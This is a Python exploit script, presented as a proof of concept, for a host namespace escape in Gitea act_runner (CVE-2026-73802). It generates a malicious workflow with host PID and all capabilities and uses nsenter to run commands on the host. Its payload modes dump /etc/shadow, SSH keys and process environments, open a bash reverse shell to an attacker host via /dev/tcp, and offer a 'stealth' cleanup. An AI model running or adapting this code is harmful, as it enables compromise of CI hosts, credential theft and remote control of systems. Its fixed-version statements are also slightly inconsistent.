#!/usr/bin/env python3
"""
Gitea act_runner Container Options Host Namespace Escape
CVE-2026-73802 | GHSA-x4q3-gcj3-m6cf | CVSS 9.9 Critical
Affected: gitea.com/gitea/runner < 3.0.0
Fixed:    gitea.com/gitea/runner > 3.0.0
Credit:   sn0x-sharma

Advisory: https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf

"""

import argparse
import json
import os
import pathlib
import platform
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import textwrap
import time
from datetime import datetime, timezone

DANGEROUS_OPTIONS = (
    "--pid=host --ipc=host --cap-add=ALL "
    "--security-opt seccomp=unconfined "
    "--security-opt apparmor=unconfined"
)

DEFAULT_MARKER   = "/tmp/CVE-2026-73802_escape_proof"
SUCCESS_TOKEN    = "CVE-2026-73802-escape-confirmed"
ADVISORY_URL     = "https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf"
FIXED_VERSION    = (3, 0, 0)

BANNER = r"""
  ██████╗██╗   ██╗███████╗    ██████╗ ██████╗ ██████╗ ██████╗ ██████╗
 ██╔════╝██║   ██║██╔════╝   ╚════██╗╚════██╗╚════██╗╚════██╗╚════██╗
 ██║     ██║   ██║█████╗      █████╔╝ █████╔╝ █████╔╝ █████╔╝ █████╔╝
 ██║     ╚██╗ ██╔╝██╔══╝     ██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══╝
 ╚██████╗ ╚████╔╝ ███████╗   ███████╗███████╗███████╗███████╗███████╗
  ╚═════╝  ╚═══╝  ╚══════╝   ╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝

  CVE-2026-73802  |  Gitea act_runner Privileged Mode Bypass
  GHSA-x4q3-gcj3-m6cf  |  CVSS 9.9 Critical
  Credit: sn0x-sharma  |  Fixed in runner > 3.0.0
"""
def build_parser():
    p = argparse.ArgumentParser(
        description="CVE-2026-73802 — Gitea act_runner host namespace escape PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--runner",      default="act_runner",       help="Path to act_runner binary.")
    p.add_argument("--image",       default="ubuntu:22.04",     help="Container image for the job.")
    p.add_argument("--marker",      default=DEFAULT_MARKER,     help="Absolute host path for escape proof file.")
    p.add_argument("--workdir",     default="",                 help="Working directory (default: auto temp).")
    p.add_argument("--keep-workdir",action="store_true",        help="Keep generated workflow directory after run.")
    p.add_argument("--timeout",     type=int, default=180,      help="act_runner exec timeout in seconds.")
    p.add_argument("--debug",       action="store_true",        help="Pass --debug to act_runner.")
    p.add_argument("--pull",        action="store_true",        help="Pull container image before run.")
    p.add_argument("--stealth",     action="store_true",        help="Remove marker and artifacts after verification.")
    p.add_argument("--check-only",  action="store_true",        help="Only check runner version, do not exploit.")
    p.add_argument("--report",      default="",                 help="Save JSON report to this path.")

    modes = p.add_argument_group("exploit modes (choose one)")
    modes.add_argument(
        "--mode",
        default="marker",
        choices=["marker", "creds", "revshell", "full"],
        help=(
            "marker   — write escape proof file (default)\n"
            "creds    — dump env vars, /proc/1/environ, shadow, SSH keys\n"
            "revshell — connect back to --lhost:--lport\n"
            "full     — marker + creds + optional revshell"
        ),
    )
    modes.add_argument("--lhost", default="", help="Attacker IP for reverse shell.")
    modes.add_argument("--lport", type=int, default=4444, help="Attacker port for reverse shell (default 4444).")

    return p

def get_runner_version(runner_bin: str) -> tuple:
    """Return (major, minor, patch) or (0,0,0) on failure."""
    try:
        out = subprocess.check_output(
            [runner_bin, "--version"], stderr=subprocess.STDOUT, text=True, timeout=10
        )
        m = re.search(r"(\d+)\.(\d+)\.(\d+)", out)
        if m:
            return tuple(int(x) for x in m.groups())
    except Exception:
        pass
    return (0, 0, 0)


def check_vulnerability(runner_bin: str) -> dict:
    ver = get_runner_version(runner_bin)
    ver_str = ".".join(str(x) for x in ver) if ver != (0, 0, 0) else "unknown"
    vulnerable = ver == (0, 0, 0) or ver < FIXED_VERSION
    return {
        "runner_binary": runner_bin,
        "detected_version": ver_str,
        "fixed_version": ".".join(str(x) for x in FIXED_VERSION),
        "vulnerable": vulnerable,
        "status": "VULNERABLE" if vulnerable else "PATCHED",
    }

def _nsenter(cmd: str) -> str:
    """Wrap a shell command in nsenter to run in host PID 1 namespaces."""
    return f"nsenter -t 1 -m -u -i -n -p -- sh -c {shlex.quote(cmd)}"


def payload_marker(marker: str) -> str:
    inner = (
        f"echo {shlex.quote(SUCCESS_TOKEN)} > {shlex.quote(marker)}; "
        f"echo '---' >> {shlex.quote(marker)}; "
        f"id >> {shlex.quote(marker)}; "
        f"hostname >> {shlex.quote(marker)}; "
        f"uname -a >> {shlex.quote(marker)}"
    )
    return _nsenter(inner)


def payload_creds(marker: str) -> str:
    """Dump env, /proc/1/environ, /etc/shadow, ~/.ssh into marker file."""
    inner = (
        f"echo {shlex.quote(SUCCESS_TOKEN)} > {shlex.quote(marker)}; "
        f"echo '=== HOST ID ===' >> {shlex.quote(marker)}; "
        f"id >> {shlex.quote(marker)}; "
        f"echo '=== HOSTNAME ===' >> {shlex.quote(marker)}; "
        f"hostname >> {shlex.quote(marker)}; "
        f"echo '=== UNAME ===' >> {shlex.quote(marker)}; "
        f"uname -a >> {shlex.quote(marker)}; "
        f"echo '=== /proc/1/environ ===' >> {shlex.quote(marker)}; "
        f"cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' >> {shlex.quote(marker)} || true; "
        f"echo '=== /etc/shadow ===' >> {shlex.quote(marker)}; "
        f"cat /etc/shadow 2>/dev/null >> {shlex.quote(marker)} || true; "
        f"echo '=== SSH KEYS ===' >> {shlex.quote(marker)}; "
        f"find /root /home -name 'id_*' -o -name 'authorized_keys' 2>/dev/null | "
        f"xargs cat 2>/dev/null >> {shlex.quote(marker)} || true; "
        f"echo '=== DOCKER SOCKET ===' >> {shlex.quote(marker)}; "
        f"ls -la /var/run/docker.sock 2>/dev/null >> {shlex.quote(marker)} || true; "
        f"echo '=== RUNNER ENV ===' >> {shlex.quote(marker)}; "
        f"env >> {shlex.quote(marker)} 2>/dev/null || true"
    )
    return _nsenter(inner)


def payload_revshell(marker: str, lhost: str, lport: int) -> str:
    """Write marker proof then connect back."""
    revshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    inner = (
        f"echo {shlex.quote(SUCCESS_TOKEN)} > {shlex.quote(marker)}; "
        f"id >> {shlex.quote(marker)}; "
        f"{revshell}"
    )
    return _nsenter(inner)


def payload_full(marker: str, lhost: str, lport: int) -> str:
    """Creds dump + optional reverse shell callback."""
    creds_part = (
        f"echo {shlex.quote(SUCCESS_TOKEN)} > {shlex.quote(marker)}; "
        f"id >> {shlex.quote(marker)}; "
        f"hostname >> {shlex.quote(marker)}; "
        f"uname -a >> {shlex.quote(marker)}; "
        f"cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' >> {shlex.quote(marker)} || true; "
        f"cat /etc/shadow 2>/dev/null >> {shlex.quote(marker)} || true; "
        f"find /root /home -name 'id_*' 2>/dev/null | xargs cat >> {shlex.quote(marker)} 2>/dev/null || true"
    )
    if lhost:
        revshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        inner = f"{creds_part}; {revshell}"
    else:
        inner = creds_part
    return _nsenter(inner)


def select_payload(mode: str, marker: str, lhost: str, lport: int) -> str:
    if mode == "creds":
        return payload_creds(marker)
    if mode == "revshell":
        if not lhost:
            raise SystemExit("[!] --lhost is required for revshell mode")
        return payload_revshell(marker, lhost, lport)
    if mode == "full":
        return payload_full(marker, lhost, lport)
    return payload_marker(marker)
  
def write_workflow(root: pathlib.Path, run_cmd: str, image: str) -> pathlib.Path:
    workflows = root / ".gitea" / "workflows"
    workflows.mkdir(parents=True, exist_ok=True)
    workflow = f"""\
name: CVE-2026-73802-poc

on:
  - push

jobs:
  escape:
    runs-on: ubuntu-latest
    container:
      image: {image}
      options: >-
        {DANGEROUS_OPTIONS}
    steps:
      - name: namespace-escape
        run: |
          set -eu
          {run_cmd}
"""
    path = workflows / "poc.yml"
    path.write_text(workflow, encoding="utf-8")
    return path

def run_runner(args, root: pathlib.Path):
    cmd = [
        args.runner, "exec",
        "-C", str(root),
        "-W", str(root / ".gitea" / "workflows"),
        "-j", "escape",
        "--container-daemon-socket=-",
        "--image", args.image,
    ]
    if args.pull:
        cmd.append("--pull")
    if args.debug:
        cmd.append("--debug")
    print(f"[*] executing: {' '.join(shlex.quote(x) for x in cmd)}", flush=True)
    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=args.timeout,
        check=False,
    )

def validate_marker(marker: str):
    if not marker.startswith("/"):
        raise SystemExit("[!] marker must be an absolute path")
    if not re.fullmatch(r"[A-Za-z0-9._/\-]+", marker):
        raise SystemExit("[!] marker path contains unsupported characters")
    if marker.rstrip("/") in {"", "/", "/tmp", "/var/tmp"}:
        raise SystemExit("[!] marker must be a file, not a directory")


def read_marker(marker: str) -> str:
    try:
        return pathlib.Path(marker).read_text(encoding="utf-8", errors="replace")
    except FileNotFoundError:
        return ""
    except PermissionError as exc:
        raise SystemExit(f"[!] marker exists but unreadable: {exc}") from exc


def remove_marker(marker: str):
    try:
        pathlib.Path(marker).unlink()
    except (FileNotFoundError, PermissionError):
        pass


def check_docker():
    if shutil.which("docker") is None:
        print("[!] WARNING: docker not found in PATH — act_runner may fail", flush=True)
    sock = pathlib.Path("/var/run/docker.sock")
    if not sock.exists():
        print("[!] WARNING: /var/run/docker.sock not found", flush=True)
    else:
        print("[+] Docker socket present", flush=True)

def build_report(ver_info: dict, mode: str, success: bool, marker_content: str, elapsed: float) -> dict:
    return {
        "cve": "CVE-2026-73802",
        "ghsa": "GHSA-x4q3-gcj3-m6cf",
        "cvss": "9.9",
        "advisory": ADVISORY_URL,
        "credit": "sn0x-sharma",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "host": platform.node(),
        "runner": ver_info,
        "mode": mode,
        "success": success,
        "elapsed_seconds": round(elapsed, 2),
        "marker_content": marker_content,
    }


def save_report(report: dict, path: str):
    pathlib.Path(path).write_text(
        json.dumps(report, indent=2), encoding="utf-8"
    )
    print(f"[+] report saved → {path}", flush=True)

def main():
    print(BANNER, flush=True)
    args = build_parser().parse_args()

    # Resolve runner binary
    runner_bin = (
        shutil.which(args.runner)
        if os.path.basename(args.runner) == args.runner
        else args.runner
    )
    if not runner_bin:
        raise SystemExit(f"[!] act_runner binary not found: {args.runner}")
    args.runner = runner_bin

    # Version / vulnerability check
    ver_info = check_vulnerability(args.runner)
    print(f"[*] runner binary  : {ver_info['runner_binary']}", flush=True)
    print(f"[*] detected version: {ver_info['detected_version']}", flush=True)
    print(f"[*] status          : {ver_info['status']}", flush=True)

    if args.check_only:
        sys.exit(0 if ver_info["vulnerable"] else 1)

    if not ver_info["vulnerable"]:
        print("[!] runner appears patched (>= 3.0.0) — exploit may not work", flush=True)

    validate_marker(args.marker)
    check_docker()

    # Build payload
    run_cmd = select_payload(args.mode, args.marker, args.lhost, args.lport)
    print(f"[*] mode: {args.mode}", flush=True)

    # Setup workdir
    remove_marker(args.marker)
    temp = None
    if args.workdir:
        root = pathlib.Path(args.workdir).resolve()
        root.mkdir(parents=True, exist_ok=True)
    else:
        temp = tempfile.TemporaryDirectory(prefix="cve-2026-73802-poc-")
        root = pathlib.Path(temp.name)

    workflow = write_workflow(root, run_cmd, args.image)
    print(f"[*] workflow written: {workflow}", flush=True)

    # Execute
    t0 = time.monotonic()
    try:
        result = run_runner(args, root)
    finally:
        if temp and not args.keep_workdir:
            temp.cleanup()

    elapsed = time.monotonic() - t0
    print(result.stdout, end="", flush=True)

    if result.returncode != 0:
        print(f"[!] act_runner exited with code {result.returncode}", flush=True)

    marker_content = read_marker(args.marker)
    success = SUCCESS_TOKEN in marker_content

    if success:
        print("\n[+] ══════════════════════════════════════════", flush=True)
        print("[+]  HOST NAMESPACE ESCAPE CONFIRMED", flush=True)
        print("[+] ══════════════════════════════════════════", flush=True)
        print(marker_content, flush=True)
    else:
        print("[-] escape not verified — marker not found or token missing", flush=True)

    # Stealth cleanup
    if args.stealth and success:
        remove_marker(args.marker)
        print("[*] stealth: marker removed", flush=True)

    # Report
    if args.report:
        report = build_report(ver_info, args.mode, success, marker_content, elapsed)
        save_report(report, args.report)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
